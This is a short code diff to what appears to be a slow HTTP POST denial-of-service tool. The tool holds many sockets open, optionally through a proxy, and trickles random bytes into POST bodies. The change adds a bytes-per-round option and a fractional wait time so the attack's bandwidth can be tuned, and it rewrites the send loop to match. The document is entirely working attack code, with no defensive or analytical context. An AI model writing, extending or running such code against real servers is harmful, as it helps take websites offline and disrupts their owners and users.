@@ -110,9 +110,16 @@ def cli():
    parser.add_argument(
       "-t", "--time",
       default=10,
-      type=int,
+      type=float,
       help="Period of time in seconds that the program will wait " + 
       "before performing another round of byte sending. Default is 10."
+   )
+   parser.add_argument(
+      "-b", "--bytes",
+      default=1,
+      type=int,
+      help="Number of bytes that will be sent per round. Use it in combination " +
+      "with -t, --time option in order to the set the bandwidth. Default is 1."
    )
    parser.add_argument(
       "-l", "--length",
@@ -195,6 +202,7 @@ def main():
          print("Using proxy: " + args.proxy)
       socket_count = args.sockets
       round_time = args.time
+      bytes_per_round = args.bytes
       content_length = args.length
 
       list_of_sockets = []
@@ -368,7 +376,9 @@ def main():
          print("Sending byte in HTTP POST body... Socket count: " + str(len(list_of_sockets)))
          for s in list(list_of_sockets):
             try:
-               char = random.choice(string.digits + string.ascii_letters)
+               char = ""
+               for i in range(bytes_per_round):
+                  char += random.choice(string.digits + string.ascii_letters)
                s.send(char.encode("utf-8"))
             except socket.error:
                list_of_sockets.remove(s)
